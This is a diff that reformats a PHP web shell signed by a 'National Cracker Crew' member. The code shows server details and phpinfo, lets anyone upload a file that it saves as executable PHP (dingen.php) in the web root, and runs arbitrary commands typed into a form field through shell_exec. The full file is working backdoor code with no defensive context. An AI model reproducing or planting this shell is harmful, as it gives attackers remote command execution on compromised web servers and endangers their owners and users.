@@ -7,19 +7,20 @@
 <?php
 echo "<b><font color=red>Safe Mode on/off:  </font></b>";
 // Check for safe mode
-if( ini_get('safe_mode') ) {
-  print '<font color=#FF0000><b>Safe Mode ON</b></font>';
+if (ini_get('safe_mode')) {
+    print '<font color=#FF0000><b>Safe Mode ON</b></font>';
 } else {
-  print '<font color=#008000><b>Safe Mode OFF</b></font>';
+    print '<font color=#008000><b>Safe Mode OFF</b></font>';
 }
 echo "</br>";
 echo "<b><font color=red>Momentane Directory:  </font></b>"; echo $_SERVER['DOCUMENT_ROOT'];
 echo "</br>";
 echo "<b><font color=red>Server: </font></b><br>"; echo $_SERVER['SERVER_SIGNATURE'];
 echo "<a href='$php_self?p=info'>PHPinfo</a>";
-if(@$_GET['p']=="info"){
-@phpinfo();
-exit;}
+if (@$_GET['p']=="info") {
+    @phpinfo();
+    exit;
+}
 ?>
 <h1>---------------------------------------------------------------------------</h1><br>
 <h2>- Upload -</h2>
@@ -35,12 +36,17 @@ exit;}
 <?php
 
  if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {
-   // Alternativ:            and   $_FILES['probe']['size']
-   move_uploaded_file($_FILES['probe']['tmp_name'], "./dingen.php");
-   printf("Die Datei %s wurde als dingen.php hochgeladen.<br />\n",
-     $_FILES['probe']['name']);
-   printf("Sie ist %u Bytes groß und vom Typ %s.<br />\n",
-     $_FILES['probe']['size'], $_FILES['probe']['type']);
+     // Alternativ:            and   $_FILES['probe']['size']
+     move_uploaded_file($_FILES['probe']['tmp_name'], "./dingen.php");
+     printf(
+         "Die Datei %s wurde als dingen.php hochgeladen.<br />\n",
+         $_FILES['probe']['name']
+     );
+     printf(
+         "Sie ist %u Bytes groß und vom Typ %s.<br />\n",
+         $_FILES['probe']['size'],
+         $_FILES['probe']['type']
+     );
  }
 ?>
 <h1>---------------------------------------------------------------------------</h1><br>
@@ -53,7 +59,7 @@ echo "<b><font color=red><br>REFERER: </font></b>"; echo $_SERVER['HTTP_USER_AGE
 ?>
 <h1>---------------------------------------------------------------------------</h1><br>
 <h2>Directory Lister</h2>
-<? $cmd = $_REQUEST["-cmd"];?><onLoad="document.forms[0].elements[-cmd].focus()"><form method=POST><br><input type=TEXT name="-cmd" size=64 value=<?=$cmd?>><hr><pre><?if($cmd != "") print Shell_Exec($cmd);?></pre></form><br>
+<?php $cmd = $_REQUEST["-cmd"];?><onLoad="document.forms[0].elements[-cmd].focus()"><form method=POST><br><input type=TEXT name="-cmd" size=64 value=<?=$cmd?>><hr><pre><?if($cmd != "") print Shell_Exec($cmd);?></pre></form><br>
 <h1>---------------------------------------------------------------------------</h1><br>
 <b>--Coded by Silver©--<br>
 ~|_Team .:National Cracker Crew:._|~<br>
